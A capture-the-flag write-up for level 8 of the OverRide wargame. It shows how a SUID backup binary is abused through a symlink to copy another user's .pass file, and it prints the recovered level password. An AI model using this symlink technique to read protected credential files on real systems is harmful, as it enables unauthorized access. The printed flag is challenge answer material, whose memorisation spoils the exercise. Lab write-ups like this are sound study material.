# Level 8

## Vulnerability

Binary backs up password via symlink

## Context

We find a binary ```level08``` and a directory ```backups``` containing ```.log```, all with owner ```level09``` and SUID.
```
level08@OverRide:~$ ls -l
...
drwxrwx---+ 1 level09 users    60 Oct 19  2016 backups
-rwsr-s---+ 1 level09 users 12975 Oct 19  2016 level08
level08@OverRide:~$ ls -la backups/
...
-rwxrwx---+ 1 level09 users     0 Oct 19  2016 .log
```

When run without arguments its prints ```Usage: ./level08 filename```.
```
level08@OverRide:~$ ./level08
Usage: ./level08 filename
```

When run with a file as argument it copies the file to the ```./backups/``` folder.
```
level08@OverRide:~$ chmod 777 .
level08@OverRide:~$ echo "oh hi" > hi
level08@OverRide:~$ ./level08 hi
level08@OverRide:~$ cat backups/hi
oh hi
```

It also creates a log of the backup
```
level08@OverRide:~$ cat backups/.log
LOG: Starting back up: hi
LOG: Finished back up hi
```

## Solution

Can we simply backup the password?
```
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

No, because it doesn't deal with files inside directories (concaternates filepath ```//```), it only works with files in the current directory. So, in the home directory, lets create a symlink to ```/home/users/level09/.pass```. Now we can run the binary on the symlink, and it creates a backup of the password file in the ```backups/``` folder.
```
level08@OverRide:~$ ln -s /home/users/level09/.pass password
level08@OverRide:~$ ./level08 password
level08@OverRide:~$ cat backups/password
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
